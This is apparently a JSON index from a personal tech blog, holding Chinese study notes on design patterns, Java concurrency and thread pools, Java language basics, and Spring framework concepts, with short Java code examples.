https://www.acwing.com/file_system/file/content/whole/index/content/3030414/\n租云服务器和配置docker https://www.acwing.com/file_system/file/content/whole/index/content/3074146/\n","permalink":"https://kevinerr.github.io/posts/tech/linux/","summary":"Linux常用命令 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 打包并压缩文件:“tar -czvf 压缩包名.tar.gz 文件名” 解压并展开压缩包:“tar -xzvf","title":"linux"},{"content":"好东西\n设计模式的原则 1、开闭原则（Open Close Principle） 开闭原则的意思是：对扩展开放，对修改关闭。在程序需要进行拓展的时候，不能去修改原有的代码，实现一个热插拔的效果。简言之，是为了使程序的扩展性好，易于维护和升级。想要达到这样的效果，我们需要使用接口和抽象类，后面的具体设计中我们会提到这点。\n2、里氏代换原则（Liskov Substitution Principle） 里氏代换原则是面向对象设计的基本原则之一。 里氏代换原则中说，任何基类可以出现的地方，子类一定可以出现。LSP 是继承复用的基石，只有当派生类可以替换掉基类，且软件单位的功能不受到影响时，基类才能真正被复用，而派生类也能够在基类的基础上增加新的行为。里氏代换原则是对开闭原则的补充。实现开闭原则的关键步骤就是抽象化，而基类与子类的继承关系就是抽象化的具体实现，所以里氏代换原则是对实现抽象化的具体步骤的规范。\n3、依赖倒转原则（Dependence Inversion Principle） 这个原则是开闭原则的基础，具体内容：针对接口编程，依赖于抽象而不依赖于具体。\n4、接口隔离原则（Interface Segregation Principle） 这个原则的意思是：使用多个隔离的接口，比使用单个接口要好。它还有另外一个意思是：降低类之间的耦合度。由此可见，其实设计模式就是从大型软件架构出发、便于升级和维护的软件设计思想，它强调降低依赖，降低耦合。\n5、迪米特法则，又称最少知道原则（Demeter Principle） 最少知道原则是指：一个实体应当尽量少地与其他实体之间发生相互作用，使得系统功能模块相对独立。\n6、合成复用原则（Composite Reuse Principle） 合成复用原则是指：尽量使用合成/聚合的方式，而不是使用继承。\n设计模式的分类 创建型模式 创建型模式简单来说就是用来创建对象的。\n单例模式：确保某一个类只有一个实例，并且提供一个全局访问点。 建造者模式： 用来创建复杂的复合对象。 工厂方法模式 ：让子类来决定要创建哪个对象。 抽象工厂模式：创建多个产品族中的产品对象。 原型模式：通过复制原型来创建新对象。clone 语法糖cloneable（想要和周杰伦一样的奶茶）\n行为型模式 行为型模式主要是描述类或者对象是怎样交互和怎样分配职责的。\n策略模式：封装不同的算法，算法之间能互相替换。 状态模式：根据不同的状态做出不同的行为。 责任连模式：将事件沿着链去处理。 观察者模式：状态发生改变时通知观察者，一对多的关系。 模板方法模式：定义一套流程模板，根据需要实现模板中的操作。 迭代器模式：提供一种方法顺序访问一个聚合对象中的各个元素。 迭代器模式：保存对象的状态，在需要时进行恢复。 访问者模式：稳定数据结构中，定义新的操作行为。 中介者模式：将网状结构转变为星型结构，所有行为都通过中介。 解释器模式：定义语法，并对其进行解释。 命令模式 ：将请求封装成命令，并记录下来，能够撤销与重做。\n结构型模式 结构型模式主要是用于处理类或者对象的组合。\n外观模式、桥接模式、组合模式、享元模式。 代理模式 ：控制客户端对对象的访问。 组合模式：将整体与局部（树形结构）进行递归组合，让客户端能够以一种的方式对其进行处理。 适配器模式：将原来不兼容的两个类融合在一起。 装饰者模式 ：为对象添加新功能。 享元模式：使用对象池来减少重复对象的创建。 外观模式 ：对外提供一个统一的接口用来访问子系统。 桥接模式：将两个能够独立变化的部分分离开来。\n单例 饿汉式：变量在申明时就初始化。将构造方法定义为private，必须getInstance才能获取唯一实例（即使单例不需要使用，也会在类加载后创建出来占用内存）\n工厂 简单工厂只需要和工厂打交道，需要啥告诉工厂就行。当产品过多时，工厂庞大。生成新的产品不行。 抽象工厂提取工厂接口。interface、implements（sql替换成access数据库就很简单）适用于增加同类工厂这样的横向扩展需求，不适用于新增功能这样的纵向需求。\n代理 策略 模板方法 观察者 适配器 责任链 建造者 创建过程稳定但配置多变 制造奶茶（是否+珍珠 去冰/冰/常温 全糖/半糖）\n","permalink":"https://kevinerr.github.io/posts/tech/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/","summary":"好东西 设计模式的原则 1、开闭原则（Open Close Principle） 开闭原则的意思是：对扩展开放，对修改关闭。在程序需要进行拓展的时候，不能去修","title":"设计模式"},{"content":"并发编程基础 线程会带来额外的开销，如cpu调度\n继承thread类，重写run()方法，调用start()开启线程\nrun() 只有主线程一条执行路径；start()多条执行路径，主线程和子线程并行交替执行。\n实现runnable接口\n实现callable接口（FutureTask，可以通过get阻塞获取线程结果）\njava默认2个线程：main和gc\njava无法开启线程，只能调用底层c++，无法操作硬件\n并发：cpu一核（充分利用cpu资源） 并行：cpu多核\n线程有几个状态 1 2 3 4 5 6  NEW, //新生 RUNNABLE, BLOCKED, //阻塞 WAITING, TIMED_WAITING, //超时等待 TERMINATED; //终止   wait/sleep区别 1、wait()方法属于Object类,sleep()属于Thread类；\n2、wait()方法释放cpu给其他线程，自己让出资源进入等待池等待；sleep占用cpu，不让出资源；\n3、sleep()必须指定时间，wait()可以指定时间也可以不指定；sleep()时间到，线程处于临时阻塞或运行状态；\n4、wait()方法会释放持有的锁，不然其他线程不能进入同步方法或同步块，从而不能调用notify(),notifyAll()方法来唤醒线程，产生死锁，所以释放锁，可以执行其他线程，也可以唤醒自己，只是设置停止自己的时间时不确定的；sleep方法不会释放持有的锁，设置sleep的时间是确定的会按时执行的；\n5、wait()方法只能在同步方法或同步代码块中调用，否则会报illegalMonitorStateException异常，如果没有设定时间，使用notify()来唤醒；而sleep()能在任何地方调用，必须捕获异常；\n线程礼让 yield()  礼让线程,让当前正在执行的线程暂停,但不阻塞 将线程从运行状态转为就绪状态 让CPU重新调度,礼让不一定成功,看CPU心情  线程强制执行 join()  Join合并线程,待此线程执行完成后,在执行其他线程,其他线程阻塞 可以想象成插队  集合类 Vector：jdk1.0就有，加锁\nArrayList ：jdk1.2才有，不加锁\n1 2 3 4 5 6  Collections.synchronizedList(new ArrayList\u0026lt;\u0026gt;());   CopyOnWriteArrayList //修改副本，替换引用  HashSet 底层HashMap add时只添加key value是一个PRESENT的定值   线程池 三大方法，七大参数，四种拒绝策略\n程序的运行，本质：占用系统的资源 优化资源的使用 =》 池化技术\n线程池、连接池、内存池、对象池。。。 池化技术：事先准备好一些资源，有人要用，就来我这里拿，用完之后还我。\n三大方法 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  //固定线程数池 core = max，都不可回收 ExecutorService executorService = Executors.newFixedThreadPool(5); //单例线程池 单线程线程池，后台从队列里获取任务，挨个执行 ExecutorService executorService1 = Executors.newSingleThreadExecutor(); //缓存线程数池 core是0，所有都可回收 ExecutorService executorService2 = Executors.newCachedThreadPool();  try {  for (int i = 0; i \u0026lt; 10; i++) {  executorService.execute(()-\u0026gt;{  System.out.println(Thread.currentThread().getName()+\u0026#34; ok\u0026#34;);  });  } } catch (Exception e) {  e.printStackTrace(); }finally{  //线程池用完，程序结束，关闭线程池  executorService1.shutdown(); }   七大参数 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  corePoolSize 核心线程数  //获取cpu核心 System.out.println(Runtime.getRuntime().availableProcessors()); ThreadPoolExecutor threadPoolExecutor = new ThreadPoolExecutor(  2,// 核心线程数  Runtime.getRuntime().availableProcessors(),// 最大核心线程数  3,// 超时时间  TimeUnit.SECONDS,// 超时单位  new LinkedBlockingDeque\u0026lt;\u0026gt;(3),// 阻塞队列  Executors.defaultThreadFactory(),// 默认线程工厂，不用动它  new ThreadPoolExecutor.AbortPolicy() //线程池处理不过来就抛出异常(拒绝策略) ); try {  //最大承载：deque+max  for (int i = 0; i \u0026lt; 20; i++) {  threadPoolExecutor.execute(()-\u0026gt;{  System.out.println(Thread.currentThread().getName()+\u0026#34; ok\u0026#34;);  });  } } catch (Exception e) {  e.printStackTrace(); }finally{  //线程池用完，程序结束，关闭线程池  threadPoolExecutor.shutdown(); }   四种拒绝策略 1 2 3 4 5 6 7  new ThreadPoolExecutor.AbortPolicy() 线程池处理不过来就抛出异常  new ThreadPoolExecutor.CallerRunsPolicy() 哪来的去哪里；它直接在 execute 方法的调用线程中运行被拒绝的任务；如果执行程序已关闭，则会丢弃该任务  new ThreadPoolExecutor.DiscardPolicy() 队列满了，丢掉任务，不会抛异常  new ThreadPoolExecutor.DiscardOldestPolicy() 抛弃最老的    降低资源的消耗 提高响应的速度 方便管理  线程复用、可以控制最大并发数、管理线程\n1  System.out.println(Runtime.getRuntime().availableProcessors()); //h   最大线程数怎么定义：\n cpu 密集型 ：几核，就是几，可以保持cpu的效率最高 io 密集型 ：判断你程序中十分耗费io的线程  CompletableFuture异步编排 https://www.jianshu.com/p/934057982c25\nLock锁 公平锁和非公平锁 可重入锁（递归锁） 自旋锁 读写锁 synchronized和Lock锁区别 　1、首先synchronized是java内置关键字，Lock是个java类；\n　2、synchronized无法判断是否获取锁的状态，Lock可以判断是否获取到锁；\n　3、synchronized会自动释放锁(a 线程执行完同步代码会释放锁 ；b 线程执行过程中发生异常会释放锁)，Lock需在finally中手工释放锁（unlock()方法释放锁），否则容易造成线程死锁；\n　4、用synchronized关键字的两个线程1和线程2，如果当前线程1获得锁，线程2线程等待。如果线程1阻塞，线程2则会一直等待下去，而Lock锁就不一定会等待下去，如果尝试获取不到锁，线程可以不用一直等待就结束了；\n　5、synchronized的锁可重入、不可中断、非公平，而Lock锁可重入、可判断、可公平（两者皆可）；\n　6、synchronized锁适合代码少量的同步问题，Lock锁适合大量同步的代码的同步问题。\n生产者消费者问题 所谓的生产者消费者问题，是通过一个容器来解决生产者和消费者的强耦合问题。通俗的讲，就是生产者在不断的生产，消费者也在不断的消费，可是消费者消费的产品是生产者生产的，这就必然存在一个中间容器，我们可以把这个容器想象成是一个货架，当货架空的时候，生产者要生产产品，此时消费者在等待生产者往货架上生产产品，而当货架满的时候，消费者可以从货架上拿走商品，生产者此时等待货架的空位，这样不断的循环。那么在这个过程中，生产者和消费者是不直接接触的，所谓的‘货架’其实就是一个阻塞队列，生产者生产的产品不直接给消费者消费，而是仍给阻塞队列，这个阻塞队列就是来解决生产者消费者的强耦合的。就是生产者消费者问题。\n回忆 synchronized 关键字，它配合 Object 的 wait()、notify() 系列方法可以实现等待/通知模式。对于 Lock，通过 Condition 也可以实现等待/通知模式。Condition是在java 1.5中才出现的，它用来替代传统的Object的wait()、notify()实现线程间的协作，相比使用Object的wait()、notify()，使用Condition的await()、signal()这种方式实现线程间协作更加安全和高效。\nif只判断一次，虚假唤醒，一般使用while\n经典8锁问题 1、new this 调用的是这个对象，是一个具体的对象！ 2、static class 唯一的一个模板！ 在我们编写多线程程序得时候，只需要搞明白这个到底锁的是什么就不会出错了！\n安全类 并发下ArrayList是不安全的，Vector是安全的\n1 2 3 4 5 6  //解决办法 List\u0026lt;String\u0026gt; list2 = new Vector\u0026lt;\u0026gt;(); 使用synchronized List\u0026lt;String\u0026gt; list1 = Collections.synchronizedList(new ArrayList\u0026lt;\u0026gt;()); List\u0026lt;String\u0026gt; list3 = new CopyOnWriteArrayList\u0026lt;\u0026gt;(); //CopyOnWrite 写入时复制 COW计算机程序设计的一种优化策略，再写入时避免覆盖 //我们都知道Vector是增删改查方法都加了synchronized，保证同步，但是每个方法执行的时候都要去获得锁，性能就会大大下降，而CopyOnWriteArrayList 只是在增删改上加锁，但是读不加锁，在读方面的性能就好于Vector，CopyOnWriteArrayList支持读多写少的并发情况。   Set不安全\n1 2 3  Set\u0026lt;String\u0026gt; set = new HashSet\u0026lt;\u0026gt;(); Set\u0026lt;String\u0026gt; set1 = Collections.synchronizedSet(new HashSet\u0026lt;\u0026gt;()); Set\u0026lt;String\u0026gt; set2 = new CopyOnWriteArraySet\u0026lt;\u0026gt;();   HashSet的底层就是HashMap\nHashMap不安全\n1 2 3  Map\u0026lt;String,String\u0026gt; map= new HashMap\u0026lt;\u0026gt;(16,0.75); Map\u0026lt;String,String\u0026gt; map= new HashMap\u0026lt;\u0026gt;(); Map\u0026lt;String,String\u0026gt; map1= new ConcurrentHashMap\u0026lt;\u0026gt;();   callable Callable 和 Runnable 的使用方法大同小异， 区别在于： 1.Callable 使用 call（） 方法， Runnable 使用 run() 方法 2.call() 可以返回值， 而 run()方法不能返回。 3.call() 可以抛出受检查的异常，比如ClassNotFoundException， 而run()不能抛出受检查的异常。\n通过FutureTask和Runnable 挂上关系\n三大常用辅助类 CountDownLatch（减法计数器） 说明： 一个线程等待其他线程执行完之后再执行，相当于加强版的join，在初始化CountDownLatch是需要设定计数器的数值（计数器数据不一定跟线程数相同，但是一定计数器的值一定是要大于等于线程数，一个线程中可以进行多次扣减。当计数器扣减至0时才可继续向下执行）\n举例说明： 比如LOL在游戏开始时需要玩家全部准备完毕之后才开始，开始游戏可以理解为“主线程”，玩家准备理解为“其他线程”，在“其他线程”没有准备完毕之前，“主线程时等待状态”，当“其他线程”准备完毕之后“主线程”就会执行下一步开始游戏的动作\n1 2 3  private static CountDownLatch countDownLatsh = new CountDownLatch(5); countDownLatsh.countDown(); countDownLatsh.await();   CyclicBarrier（加法计数器） 说明： 让一组线程到达某个屏障，然后被阻塞，一直到最后一个线程到达屏障，然后屏障开放，所有被阻塞的线程继续执行，计数器与线程数相等。 CyclicBarrier(int parties, Runnable barrierAction) 当时使用这个构造函数时，barrierAction定义的任务会执行\n集齐7科龙珠召唤神龙\n1 2  private static CyclicBarrier cyclicBarrier = new CyclicBarrier(5); cyclicBarrier.await();   Semaphore（限流的时候用） 1 2 3  private static final Semaphore semaphore=new Semaphore(3); semaphore.acquire(); semaphore.release();   相当于os中的资源量，得到/释放\nReadWriteLock 假设有个数据对象拥有写方法与读方法，多线程环境中要想保证数据的安全，需对该对象的读写方法都要加入 synchronized同步块。这样任何线程在写入时，其它线程无法读取与改变数据；如果有线程在读取时，其他线程也无法读取或写入。这种方式在写入操作远大于读操作时，问题不大，而当读取远远大于写入时，会造成性能瓶颈，因为此种情况下读取操作是可以同时进行的，而加锁操作限制了数据的并发读取。\n​ ReadWriteLock解决了这个问题，当写操作时，其他线程无法读取或写入数据，而当读操作时，其它线程无法写入数据，但却可以读取数据 。\n1 2 3 4 5 6 7  ReadWriteLock lock = new ReentrantReadWriteLock(); Lock read = lock.readLock(); Lock write = lock.writeLock(); write.lock(); write.unlock(); read.lock(); read.unlock();   独占锁（写锁）：一次只能被一个线程占有\n共享锁（读锁）：多个线程可以同时占有\nBlockingQueue（阻塞队列） 多线程并发处理，线程池\n   方式 抛出异常 有返回值，不会抛出异常 阻塞等待 超时等待     添加 add() offer() put() offer(object , long , TimeUnit)   移除 remove() poll() take() poll(long , TimeUnit)   检测队首元素 element() peek() - -    1  BlockingQueue\u0026lt;Object\u0026gt; queue = new ArrayBlockingQueue\u0026lt;\u0026gt;(3);   SynchronousQueue（同步队列） 没有容量\n进去一个元素必须等它出来才能再加一个元素\n1  SynchronousQueue\u0026lt;String\u0026gt; synchronousQueue = new SynchronousQueue\u0026lt;\u0026gt;();   四大函数式接口 新时代的程序员：lambda表达式、函数式接口、Stream流式计算、链式编程、异步调用\nlambda表达式 基本语法: (parameters) -\u0026gt; expression 或 (parameters) -\u0026gt;{ statements; }\nLambda表达式由三部分组成：\nparamaters：类似方法中的形参列表，这里的参数是函数式接口里的参数。这里的参数类型可以明确的声明也可不声明而由JVM隐含的推断。另外当只有一个推断类型时可以省略掉圆括号。 -\u0026gt;：可理解为“被用于”的意思 statements：可以是表达式也可以代码块，是函数式接口里方法的实现。代码块可返回一个值或者什么都不反回，这里的代码块块等同于方法的方法体。如果是表达式，也可以返回一个值或者什么都不反回。\n1 2 3 4 5 6 7 8 9 10  public static void main(String[] args) { // Function\u0026lt;String, String\u0026gt; function = new Function\u0026lt;String, String\u0026gt;() { // @Override // public String apply(String str) { // return str; // } // };  Function\u0026lt;String, String\u0026gt; function = (str)-\u0026gt;{return str;};  System.out.println(function.apply(\u0026#34;啦啦啦啦啦\u0026#34;)); }   函数式接口 如果一个接口只有一个抽象方法，那么该接口就是一个函数式接口 如果我们在某个接口上声明了 @FunctionalInterface 注解，那么编译器就会按照函数式接口的定义来要求该接口，这样如果有两个抽象方法，程序编译就会报错的。所以，从某种意义上来说，只要你保证你的接口中只有一个抽象方法，你可以不加这个注解。加上就会自动进行检测的，保证安全。Function函数式接口\nFunction 函数型接口 Function 函数型接口, 有一个输入参数，有一个输出\n1 2 3 4 5 6   public static void main(String[] args) {  //输出大写后的原字符串  Function\u0026lt;String, String\u0026gt; function = str -\u0026gt; str.toUpperCase();   System.out.println(function.apply(\u0026#34;abc\u0026#34;));  }   Predicate 断定型接口 有一个输入参数，返回值只能是 布尔值！\n1 2 3 4 5 6   public static void main(String[] args) {  //判断一个字符串是否为a开头  Predicate\u0026lt;String\u0026gt; predicate = s -\u0026gt; !s.isEmpty() \u0026amp;\u0026amp; s.charAt(0) == \u0026#39;a\u0026#39;;   System.out.println(predicate.test(\u0026#34;abc\u0026#34;));  }   Consumer 消费型接口 只有输入没有输出\n1 2 3 4 5 6   public static void main(String[] args) {  //输出一个大写字符串  Consumer\u0026lt;String\u0026gt; consumer = s -\u0026gt; System.out.println(s.toUpperCase());   consumer.accept(\u0026#34;abc\u0026#34;);  }   Supplier 供给型接口 没有参数，只有输出值\n1 2 3 4 5 6   public static void main(String[] args) {  //返回一个Demo对象  Supplier\u0026lt;Demo\u0026gt; supplier = () -\u0026gt; {return new Demo();};   System.out.println(supplier.get().hashCode());  }   Stream流式计算 存储交给集合，计算交给流\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30  /** * 题目要求：只用一行代码实现 * 现在有五个用户！筛选： * 1、ID必须是偶数 * 2、年龄必须大于23岁 * 3、用户名转化为大写字母 * 4、用户名字母倒着排序 * 5、只输出一个用户 */ public class Test {  public static void main(String[] args) {  User u1 = new User(1,\u0026#34;a\u0026#34;,21);  User u2 = new User(2,\u0026#34;b\u0026#34;,22);  User u3 = new User(3,\u0026#34;c\u0026#34;,23);  User u4 = new User(4,\u0026#34;d\u0026#34;,24);  User u5 = new User(5,\u0026#34;e\u0026#34;,25);  User u6 = new User(6,\u0026#34;f\u0026#34;,26);  //集合用来存储  List\u0026lt;User\u0026gt; list = Arrays.asList(u1, u2, u3, u4, u5,u6);  //使用stream计算  //lambda表达式、链式编程、函数式接口、Stream流式计算  list.stream()  .filter(u-\u0026gt;{return u.getId()%2 == 0;})  .filter(u-\u0026gt;{return u.getAge() \u0026gt; 23;})  .map(u-\u0026gt;{return u.getName().toUpperCase();})  .sorted((uu1,uu2)-\u0026gt;{return uu2.compareTo(uu1);})  .limit(1)  .forEach(System.out::println);  } }   Forkjoin Forkjoin类似于一个递归算法，可以将一系列大问题拆分成小问题，然后逐个解决。 其中有个工作窃取的概念，即一个线程处理完成任务以后会从另一个线程中获取其他线程的任务进行处理。 由于线程是一种双端队列，可以从底部进行窃取。\nJMM JMM：Java内存模型，不存在的东西，概念，约定！\nJMM同步约定\n线程加锁前，必须把共享变量刷回主存\n线程解锁前，必须读取主存的最新值到工作内存中\n加锁和解锁是同一把锁\nstore和write换一下位置\n对一个变量执行unlock操作之前，必须先把此变量同步到主内存中（执行store和write操作）。\n read 读取，作用于主内存把变量从主内存中读取到本本地内存。 load 加载，主要作用本地内存，把从主内存中读取的变量加载到本地内存的变量副本中 use 使用，主要作用本地内存，把工作内存中的一个变量值传递给执行引擎，每当虚拟机遇到一个需要使用变量的值的字节码指令时将会执行这个操作。、 assign 赋值 作用于工作内存的变量，它把一个从执行引擎接收到的值赋值给工作内存的变量，每当虚拟机遇到一个给变量赋值的字节码指令时执行这个操作。 store 存储 作用于工作内存的变量，把工作内存中的一个变量的值传送到主内存中，以便随后的write的操作。 write 写入 作用于主内存的变量，它把store操作从工作内存中一个变量的值传送到主内存的变量中。 lock 锁定 ：作用于主内存的变量，把一个变量标识为一条线程独占状态。 unlock 解锁：作用于主内存变量，把一个处于锁定状态的变量释放出来，释放后的变量才可以被其他线程锁定。  所以看似简单的通信其实是这八种状态来实现的。\n同时在Java内存模型中明确规定了要执行这些操作需要满足以下规则：\n 不允许read和load、store和write的操作单独出现。 不允许一个线程丢弃它的最近assign的操作，即变量在工作内存中改变了之后必须同步到主内存中。 不允许一个线程无原因地（没有发生过任何assign操作）把数据从工作内存同步回主内存中。 一个新的变量只能在主内存中诞生，不允许在工作内存中直接使用一个未被初始化（load或assign）的变量。即就是对一个变量实施use和store操作之前，必须先执行过了assign和load操作。 一个变量在同一时刻只允许一条线程对其进行lock操作，lock和unlock必须成对出现 如果对一个变量执行lock操作，将会清空工作内存中此变量的值，在执行引擎使用这个变量前需要重新执行load或assign操作初始化变量的值 如果一个变量事先没有被lock操作锁定，则不允许对它执行unlock操作；也不允许去unlock一个被其他线程锁定的变量。 对一个变量执行unlock操作之前，必须先把此变量同步到主内存中（执行store和write操作）。  volatile https://www.cnblogs.com/dolphin0520/p/3920373.html\n单例模式 CAS ABA问题 ","permalink":"https://kevinerr.github.io/posts/tech/%E5%B9%B6%E5%8F%91-%E5%A4%9A%E7%BA%BF%E7%A8%8B/","summary":"并发编程基础 线程会带来额外的开销，如cpu调度 继承thread类，重写run()方法，调用start()开启线程 run() 只有主线程一条执行路径；s","title":"并发/多线程"},{"content":"基础语法  对象：对象是类的一个实例，有状态和行为。例如，一条狗是一个对象，它的状态有：颜色、名字、品种；行为有：摇尾巴、叫、吃等。 类：类是一个模板，它描述一类对象的行为和状态。 方法：方法就是行为，一个类可以有很多方法。逻辑运算、数据修改以及所有动作都是在方法中完成的。 实例变量：每个对象都有独特的实例变量，对象的状态由这些实例变量的值决定。  访问控制符 default (即默认，什么也不写）: 在同一包内可见，不使用任何修饰符。使用对象：类、接口、变量、方法。 private : 在同一类内可见。使用对象：变量、方法。 注意：不能修饰类（外部类） public : 对所有类可见。使用对象：类、接口、变量、方法 protected : 对同一包内的类和所有子类可见。使用对象：变量、方法。 注意：不能修饰类（外部类）。\n面向对象 封装 将类的某些信息隐藏在类内部，不允许外部程序直接访问，而是通过该类提供的方法来实现对隐藏信息的操作和访问。\n只能通过规定的方法访问数据。隐藏类的实例细节，方便修改和实现。\n继承 继承就是子类继承父类的特征和行为，使得子类对象（实例）具有父类的实例域和方法，或子类从父类继承方法，使得子类具有父类相同的行为。 使用 implements 关键字可以变相的使java具有多继承的特性，使用范围为类继承接口的情况，可以同时继承多个接口（接口跟接口之间采用逗号分隔） public class C implements A,B {}\n子类是不继承父类的构造器（构造方法或者构造函数）的，它只是调用（隐式或显式）。如果父类的构造器带有参数，则必须在子类的构造器中显式地通过 super 关键字调用父类的构造器并配以适当的参数列表。 如果父类构造器没有参数，则在子类的构造器中不需要使用 super 关键字调用父类构造器，系统会自动调用父类的无参构造器。\n多态 多态是同一个行为具有多个不同表现形式或形态的能力；消除类型之间的耦合关系。 多态就是同一个接口，使用不同的实例而执行不同操作，如图所示： Java 重写(Override)与重载(Overload) 重写是子类对父类的允许访问的方法的实现过程进行重新编写, 返回值和形参都不能改变。即外壳不变，核心重写！ 重写的好处在于子类可以根据需要，定义特定于自己的行为。 也就是说子类能够根据需要实现父类的方法。\n重载(overloading) 是在一个类里面，方法名字相同，而参数不同。返回类型可以相同也可以不同。 每个重载的方法（或者构造函数）都必须有一个独一无二的参数类型列表。 最常用的地方就是构造器的重载。\n方法的重写(Overriding)和重载(Overloading)是java多态性的不同表现，重写是父类与子类之间多态性的一种表现，重载可以理解成多态的具体表现形式。 接口 类描述对象的属性和方法。接口则包含类要实现的方法。 除非实现接口的类是抽象类，否则该类要定义接口中的所有方法。 接口无法被实例化，但是可以被实现。一个实现接口的类，必须实现接口内所描述的所有方法，否则就必须声明为抽象类。\n标记接口 public interface EventListener{} 建立一个公共的父接口： 正如EventListener接口，这是由几十个其他接口扩展的Java API，你可以使用一个标记接口来建立一组接口的父接口。例如：当一个接口继承了EventListener接口，Java虚拟机(JVM)就知道该接口将要被用于一个事件的代理方案。\n向一个类添加数据类型： 这种情况是标记接口最初的目的，实现标记接口的类不需要定义任何接口方法(因为标记接口根本就没有方法)，但是该类通过多态性变成一个接口类型。\n容器 ArrayList 类是一个可以动态修改的数组，与普通数组的区别就是它是没有固定大小的限制，我们可以添加或删除元素。\n 频繁访问列表中的某一个元素。 只需要在列表末尾进行添加和删除元素操作。  LinkedList 是一种常见的基础数据结构，是一种线性表，但是并不会按线性的顺序存储数据，而是在每一个节点里存到下一个节点的地址。\n 你需要通过循环迭代来访问列表中的某些元素。 需要频繁的在列表开头、中间、末尾等位置进行添加和删除元素操作。  HashSet 基于 HashMap 来实现的，是一个不允许有重复元素的集合。 HashSet 允许有 null 值。 HashSet 是无序的，即不会记录插入的顺序。 HashSet 不是线程安全的， 如果多个线程尝试同时修改 HashSet，则最终结果是不确定的。 您必须在多线程访问时显式同步对 HashSet 的并发访问。\nHashMap 是一个散列表，它存储的内容是键值对(key-value)映射。 HashMap 实现了 Map 接口，根据键的 HashCode 值存储数据，具有很快的访问速度，最多允许一条记录的键为 null，不支持线程同步。 HashMap 是无序的，即不会记录插入的顺序。\n谈谈ConcurrentHashMap1.7和1.8的不同实现 Hashmap的结构，1.7和1.8有哪些区别，史上最深入的分析\n异常 使用 try 和 catch 关键字可以捕获异常。try/catch 代码块放在异常可能发生的地方。 一个 try 代码块后面跟随多个 catch 代码块的情况就叫多重捕获。 如果一个方法没有捕获到一个检查性异常，那么该方法必须使用 throws 关键字来声明。throws 关键字放在方法签名的尾部。\n声明自定义异常 所有异常都必须是 Throwable 的子类。 如果希望写一个检查性异常类，则需要继承 Exception 类。 如果你想写一个运行时异常类，那么需要继承 RuntimeException 类。\n泛型 泛型提供了编译时类型安全检测机制，该机制允许程序员在编译时检测到非法的类型。泛型的本质是参数化类型，也就是说所操作的数据类型被指定为一个参数。 假定我们有这样一个需求：写一个排序方法，能够对整型数组、字符串数组甚至其他任何类型的数组进行排序，该如何实现？ 答案是可以使用 Java 泛型。 使用 Java 泛型的概念，我们可以写一个泛型方法来对一个对象数组排序。然后，调用该泛型方法来对整型数组、浮点数数组、字符串数组等进行排序。\n反射Reflection 是一种间接操作目标对象的机制，核心是JVM在运行的时候才动态加载类，并且对于任意一个类，都能够知道这个类的所有属性和方法，调用方法/访问属性，不需要提前在编译期知道运行的对象是谁，他允许运行中的Java程序获取类的信息，并且可以操作类或对象内部属性.\nJava语言反射提供一种动态链接程序组件的多功能方法。它允许程序创建和控制任何类的对象(根据安全性限制)，无需提前硬编码目标类。这些特性使得反射特别适用于创建以非常普通的方式与对象协作的库。例如，反射经常在持续存储对象为数据库、XML或其它外部格式的框架中使用。Java reflection 非常有用，它使类和数据结构能按名称动态检索相关信息，并允许在运行着的程序中操作这些信息。 一个类在内存中只有一个class对象\n一个类被加载后，类的整个结构都会被封装在class对象中\n只要元素类型和维度相等就是同一个class\n以下三种获取Class对象的方式有什么不同？ 1、new Object().getClass 2、Object.class 3、 Class.forName(\u0026ldquo;java.util.String\u0026rdquo;)\n（1）类名.class：JVM将使用类装载器，将类装入内存(前提是:类还没有装入内存)，不做类的初始化工作，返回Class的对象。 \u0026ndash;已知具体的类\n（2）Class.forName(\u0026ldquo;类名字符串\u0026rdquo;)：装入类，并做类的静态初始化，返回Class的对象。 \u0026ndash;已知一个类的全类名\n（3）实例对象.getClass()：对类进行静态初始化、非静态初始化；返回引用运行时真正所指的对象(子对象的引用会赋给父对象的引用变量中)所属的类的Class的对象。 \u0026ndash;已知某个类的实例\n注解Annotation I/O 图形化（Swing） Native JNI（Java Native Interface）Java本地接口\nnative是与C++联合开发的时候用的！java自己开发不用的！\n使用native关键字说明这个方法是原生函数，也就是这个方法是用C/C++语言实现的，并且被编译成了DLL，由java去调用。 这些函数的实现体在DLL中，JDK的源代码中并不包含，你应该是看不到的。对于不同的平台它们也是不同的。这也是java的底层机制，实际上java就是在不同的平台上调用不同的native方法实现对操作系统的访问的。\n native 是用做java 和其他语言（如c++）进行协作时用的 也就是native 后的函数的实现不是用java写的 既然都不是java，那就别管它的源代码了，呵呵  native的意思就是通知操作系统，这个函数你必须给我实现，因为我要使用。所以native关键字的函数都是操作系统实现的，java只能调用。\njava是跨平台的语言，既然是跨了平台，所付出的代价就是牺牲一些对底层的控制，而java要实现对底层的控制，就需要一些其他语言的帮助，这个就是native的作用了\n","permalink":"https://kevinerr.github.io/posts/tech/java%E5%9F%BA%E7%A1%80/","summary":"基础语法 对象：对象是类的一个实例，有状态和行为。例如，一条狗是一个对象，它的状态有：颜色、名字、品种；行为有：摇尾巴、叫、吃等。 类：类是一个","title":"Java基础"},{"content":"SSH Struts+Spring+Hibernate\nSSM SpringMVC+Spring+Mybatis\nORM ORM就是对象关系匹配，是为了解决面向对象与关系数据库存在的互不匹配的问题。简单来说，就是把关系数据库中的数据转换成面向对象程序中的对象。 常用的ORM框架有Hibernate和MyBatis，也就是ssh组合和ssm组合中的h与m。\nSpring ide中ioc代码\nhttps://www.bilibili.com/video/BV1gW411W7wy?p=7\nhttps://liayun.blog.csdn.net/article/details/115053350\nSpring理念 : 使现有技术更加实用 . 本身就是一个大杂烩 , 整合现有的框架技术\nSpring是一个轻量级的非入侵的控制反转、面向切片的框架\n我们可以在需要用到他的地方 , 不去实现它 , 而是留出一个接口 , 利用set , 我们去代码里修改下 .\n控制反转IoC(Inversion of Control)，是一种设计思想，DI(依赖注入)是实现IoC的一种方法\nIOC(控制反转) 通俗地讲，就是把原本需要程序员自己创建和维护的一大堆bean统统交由Spring管理。 也就是说，Spring将我们从盘根错节的依赖关系中解放了。当前对象如果需要依赖另一个对象，只要打一个@Autowired注解，Spring就会自动帮你安装上。 AOP(面向切面编程) AOP\n配置 别名\n1 2  